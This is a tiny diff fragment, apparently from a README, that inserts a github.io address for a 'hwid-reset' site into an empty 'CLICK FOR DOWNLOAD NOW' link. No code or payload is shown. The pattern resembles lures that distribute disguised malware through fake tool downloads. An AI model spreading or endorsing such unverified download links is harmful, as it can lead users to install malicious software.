@@ -4,7 +4,7 @@
 
 ---
   
-   📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+   📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://hwid-reset-yi35.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
